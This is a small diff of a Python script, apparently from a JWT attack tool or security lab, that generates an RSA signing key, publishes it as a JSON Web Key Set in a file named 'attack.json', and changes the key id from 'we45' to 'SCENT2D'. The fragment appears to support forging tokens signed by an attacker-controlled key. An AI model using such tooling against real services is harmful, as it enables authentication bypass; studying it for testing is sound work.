@@ -7,7 +7,7 @@ def main(url):
     gen_key = jwk.JWK.generate(kty="RSA", size=2048)
     public = json.loads(gen_key.export_public())
     public["use"] = "sig"
-    public["kid"] = "we45"
+    public["kid"] = "SCENT2D"
     public["alg"] = "RS256"
     full_key = {"keys": [public]}
     with open("attack.json", "w") as keyfile:
